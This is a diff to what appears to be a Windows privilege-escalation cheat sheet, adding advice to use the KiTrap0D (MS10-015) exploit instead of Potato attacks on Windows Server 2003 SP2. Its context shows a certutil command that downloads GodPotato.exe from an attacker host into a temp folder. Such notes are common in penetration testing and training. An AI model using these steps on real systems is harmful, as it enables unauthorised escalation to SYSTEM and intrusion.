@@ -32,6 +32,12 @@ whoami /all
 
 Most common path from service account → SYSTEM.
 
+> **Win2003 SP2 version check.** If `systeminfo` shows `5.2.3790 SP2` (Windows Server 2003 SP2),
+> skip Potato variants entirely -- WMIC network-targeted calls (`wmic /node:127.0.0.1`) and
+> `ITaskScheduler::SetTargetComputer` both run as `NETWORK SERVICE` (no token upgrade), and
+> churrasco likewise fails. Use **KiTrap0D (MS10-015)** instead -- see
+> [CVE PrivEsc](cve_privesc.md#kitrap0d----ms10-015-cve-2010-0232).
+
 ```powershell
 # GodPotato — works Server 2012–2022, Win 8–11
 certutil.exe -urlcache -f http://$LHOST:8000/GodPotato.exe C:\Windows\Temp\gp.exe
